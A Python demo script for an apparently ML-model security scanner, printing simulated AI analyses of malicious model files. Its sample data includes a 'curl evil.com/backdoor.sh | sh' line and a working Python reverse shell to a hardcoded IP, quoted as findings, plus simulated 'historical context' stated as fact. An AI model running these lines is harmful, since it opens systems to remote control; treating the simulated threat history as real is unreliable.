#!/usr/bin/env python3
"""
Example of using AI enrichment with LLMShield
"""

import os
from pathlib import Path

# Simulated scan results for demonstration
SAMPLE_VULNERABILITIES = [
    {
        'severity': 'critical',
        'category': 'Code Execution',
        'description': 'Dangerous eval() function detected',
        'details': 'Found eval("__import__(\'os\').system(\'curl evil.com/backdoor.sh | sh\')")',
        'remediation': 'Remove eval() calls and use safe alternatives'
    },
    {
        'severity': 'high',
        'category': 'Network Communication',
        'description': 'Suspicious network connection detected',
        'details': 'Socket connection to hardcoded IP 45.33.32.156:4444',
        'remediation': 'Remove unauthorized network connections'
    },
    {
        'severity': 'medium',
        'category': 'Obfuscation',
        'description': 'Base64 encoded payload detected',
        'details': 'Large base64 string that decodes to Python code',
        'remediation': 'Investigate and remove obfuscated code'
    }
]

MODEL_CONTEXT = {
    'framework': 'pytorch',
    'model_type': 'image_classification',
    'file_size': 548291840,  # 500MB
    'source': 'huggingface',
    'model_name': 'suspicious-model-v2'
}


def demonstrate_vulnerability_enrichment():
    """Demonstrate enriching individual vulnerabilities."""
    print("=== Vulnerability Context Enrichment ===\n")
    
    # Simulated AI response for vulnerability context
    enriched_context = {
        "explanation": "The eval() function allows execution of arbitrary Python code passed as a string. In ML models, this is particularly dangerous as models are often loaded with elevated privileges in production environments.",
        
        "attack_scenarios": [
            "1. Supply Chain Attack: Attacker embeds malicious eval() in a popular model on HuggingFace",
            "2. Model Poisoning: Backdoor activation through specific input patterns",
            "3. Lateral Movement: Using model inference servers as pivot points into internal networks"
        ],
        
        "impact": {
            "integrity": "Complete model compromise, potential training data manipulation",
            "confidentiality": "Access to sensitive training data, API keys, and system information",
            "availability": "Model can be disabled or made to produce incorrect results"
        },
        
        "historical_context": "Similar to the 2023 PyTorch compromise where malicious models were uploaded to the official repository. The 'torchexploit' campaign used eval() to establish persistence.",
        
        "risk_rating": {
            "score": 95,
            "justification": "Critical severity due to arbitrary code execution capability combined with typical elevated privileges of ML inference servers"
        }
    }
    
    print(f"Vulnerability: {SAMPLE_VULNERABILITIES[0]['description']}")
    print(f"\nAI-Enhanced Context:")
    print(f"- Explanation: {enriched_context['explanation']}")
    print(f"\n- Attack Scenarios:")
    for scenario in enriched_context['attack_scenarios']:
        print(f"  {scenario}")
    print(f"\n- Risk Score: {enriched_context['risk_rating']['score']}/100")


def demonstrate_code_analysis():
    """Demonstrate code intent analysis."""
    print("\n\n=== Code Intent Analysis ===\n")
    
    suspicious_code = """
import socket
import subprocess
s = socket.socket()
s.connect(('45.33.32.156', 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == 'exit':
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
"""
    
    # Simulated AI analysis
    code_analysis = {
        "purpose": "This code implements a reverse shell backdoor that connects to a remote server and executes commands.",
        
        "malicious_assessment": {
            "verdict": "DEFINITELY MALICIOUS",
            "confidence": 0.98,
            "indicators": [
                "Hardcoded IP address (45.33.32.156)",
                "Port 4444 commonly used for backdoors",
                "Infinite command execution loop",
                "No error handling or legitimate use case"
            ]
        },
        
        "expected_behavior": [
            "Establishes persistent connection to attacker's server",
            "Waits for commands from remote server",
            "Executes any system command sent by attacker",
            "Returns command output to attacker",
            "Maintains connection until 'exit' command"
        ],
        
        "hidden_functionality": "No additional obfuscation detected, but the code could be triggered conditionally based on model inputs or timestamps.",
        
        "security_implications": [
            "Complete system compromise possible",
            "Data exfiltration capability",
            "Potential for lateral movement",
            "Persistence if model is auto-loaded"
        ]
    }
    
    print(f"Code Sample:\n{suspicious_code}")
    print(f"\nAI Analysis:")
    print(f"- Verdict: {code_analysis['malicious_assessment']['verdict']}")
    print(f"- Confidence: {code_analysis['malicious_assessment']['confidence']}")
    print(f"- Expected Behavior: {code_analysis['expected_behavior'][0]}")


def demonstrate_risk_assessment():
    """Demonstrate contextual risk assessment."""
    print("\n\n=== Contextual Risk Assessment ===\n")
    
    deployment_context = {
        'environment': 'production_api',
        'usage': 'customer-facing inference',
        'data_sensitivity': 'high (PII processing)',
        'network_exposure': 'internet-facing'
    }
    
    # Simulated AI risk assessment
    risk_assessment = {
        "contextual_risk_score": 92,
        
        "risk_factors": {
            "vulnerability_severity": "Multiple critical and high severity vulnerabilities",
            "environment_multiplier": "2.5x due to internet-facing production deployment",
            "data_sensitivity_factor": "High risk due to PII processing",
            "attack_surface": "Large - exposed API with model loading capabilities"
        },
        
        "compound_vulnerability_analysis": "The combination of code execution (eval) and network communication creates a perfect storm for remote compromise. An attacker can use eval() to establish persistence, then use the network connection for C2 communication.",
        
        "environmental_considerations": [
            "Production API increases impact of any compromise",
            "Internet-facing deployment makes discovery likely",
            "PII processing adds regulatory and legal risks",
            "Customer-facing nature means reputational damage"
        ],
        
        "likelihood_impact_matrix": {
            "likelihood": "HIGH - Known vulnerabilities are easily exploitable",
            "impact": "CRITICAL - Full system compromise with data breach potential",
            "overall_risk": "CRITICAL - Immediate action required"
        }
    }
    
    print(f"Deployment Context: {deployment_context}")
    print(f"\nAI Risk Assessment:")
    print(f"- Contextual Risk Score: {risk_assessment['contextual_risk_score']}/100")
    print(f"- Overall Risk: {risk_assessment['likelihood_impact_matrix']['overall_risk']}")
    print(f"\n- Compound Vulnerability Analysis:")
    print(f"  {risk_assessment['compound_vulnerability_analysis']}")


def demonstrate_remediation_strategy():
    """Demonstrate AI-generated remediation strategy."""
    print("\n\n=== AI-Generated Remediation Strategy ===\n")
    
    # Simulated AI remediation plan
    remediation_plan = {
        "immediate_actions": [
            {
                "action": "Isolate affected model from production",
                "priority": "CRITICAL",
                "effort": "5 minutes",
                "command": "kubectl scale deployment model-api --replicas=0"
            },
            {
                "action": "Block network traffic to suspicious IP",
                "priority": "CRITICAL", 
                "effort": "10 minutes",
                "command": "iptables -A OUTPUT -d 45.33.32.156 -j DROP"
            }
        ],
        
        "remediation_steps": [
            {
                "step": 1,
                "action": "Extract and preserve model weights only",
                "details": "Use safe_torch to extract weights without code",
                "effort": "1 hour",
                "code": """
import torch
# Import a safe serialization library

# Load with restricted unpickler
checkpoint = torch.load('model.pth', map_location='cpu', pickle_module=RestrictedPickle)
# Save weights only
torch.save(checkpoint['model_state_dict'], 'clean_model.pt', _use_new_zipfile_serialization=True)
"""
            },
            {
                "step": 2,
                "action": "Scan all models from same source",
                "details": "Check for similar patterns in related models",
                "effort": "2 hours"
            },
            {
                "step": 3,
                "action": "Implement model signing and verification",
                "details": "Cryptographically sign trusted models",
                "effort": "1 day"
            }
        ],
        
        "long_term_improvements": [
            "Implement automated security scanning in CI/CD",
            "Use only safe serialization formats for model storage",
            "Create isolated model loading environment",
            "Regular security audits of model repository"
        ]
    }
    
    print("AI-Generated Remediation Plan:\n")
    print("IMMEDIATE ACTIONS (Do Now):")
    for action in remediation_plan['immediate_actions']:
        print(f"- [{action['priority']}] {action['action']} ({action['effort']})")
    
    print("\nREMEDIATION STEPS:")
    for step in remediation_plan['remediation_steps']:
        print(f"{step['step']}. {step['action']} (Effort: {step['effort']})")
        print(f"   Details: {step['details']}")


def demonstrate_attack_chain():
    """Demonstrate attack chain visualization."""
    print("\n\n=== Attack Chain Analysis ===\n")
    
    # Simulated AI attack chain analysis
    attack_chain = {
        "attack_scenario": "ML Model Supply Chain Compromise",
        
        "kill_chain_stages": [
            {
                "stage": "Initial Access",
                "technique": "Supply Chain Compromise",
                "details": "Malicious model uploaded to HuggingFace",
                "success_probability": "85%"
            },
            {
                "stage": "Execution",
                "technique": "Pickle Deserialization",
                "details": "eval() executes during model.load()",
                "success_probability": "95%"
            },
            {
                "stage": "Persistence",
                "technique": "Scheduled Task",
                "details": "Cron job or systemd service created",
                "success_probability": "75%"
            },
            {
                "stage": "Command & Control",
                "technique": "Reverse Shell",
                "details": "Socket connection to 45.33.32.156:4444",
                "success_probability": "90%"
            },
            {
                "stage": "Collection",
                "technique": "Data from Local System",
                "details": "Access training data, configs, secrets",
                "success_probability": "95%"
            },
            {
                "stage": "Exfiltration",
                "technique": "Exfiltration Over C2",
                "details": "Data sent via established socket",
                "success_probability": "85%"
            }
        ],
        
        "overall_success_probability": "73%",
        
        "timeline": "Complete attack chain executable in < 5 minutes from model load",
        
        "indicators_of_compromise": [
            "Outbound connection to 45.33.32.156:4444",
            "New processes spawned by ML framework",
            "Unusual file access patterns",
            "Base64 encoded strings in memory"
        ]
    }
    
    print(f"Attack Scenario: {attack_chain['attack_scenario']}\n")
    print("Kill Chain Progression:")
    for stage in attack_chain['kill_chain_stages']:
        print(f"\n{stage['stage']}:")
        print(f"  Technique: {stage['technique']}")
        print(f"  Success Probability: {stage['success_probability']}")
    
    print(f"\nOverall Attack Success Probability: {attack_chain['overall_success_probability']}")
    print(f"Timeline: {attack_chain['timeline']}")


def main():
    """Run all demonstrations."""
    print("LLMShield AI Enrichment Examples")
    print("=" * 80)
    
    demonstrate_vulnerability_enrichment()
    demonstrate_code_analysis()
    demonstrate_risk_assessment()
    demonstrate_remediation_strategy()
    demonstrate_attack_chain()
    
    print("\n\n" + "=" * 80)
    print("Key Benefits of AI Enrichment:")
    print("- Contextual understanding beyond pattern matching")
    print("- Actionable remediation strategies")
    print("- Risk assessment considering deployment context")
    print("- Attack chain visualization for security teams")
    print("- Historical context and threat intelligence")


if __name__ == "__main__":
    main()